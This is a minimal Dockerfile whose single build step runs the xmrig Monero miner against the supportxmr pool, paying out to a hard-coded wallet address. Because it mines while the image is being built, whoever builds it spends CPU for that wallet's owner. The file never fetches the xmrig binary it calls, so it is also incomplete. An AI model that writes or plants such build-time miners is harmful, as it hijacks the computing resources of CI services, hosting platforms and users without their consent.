FROM alpine

ARG VERSION=6.18.0

RUN ./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 466rMXjH3VcW9qUSVjjkdXREYLGvBd2RwVg295Z7jrMJTnSzQbGbpgSEWpomVV7FNnikzDkYf7Fs4EVQRviBuPQD1ofi4Ck -k --tls -p Rin
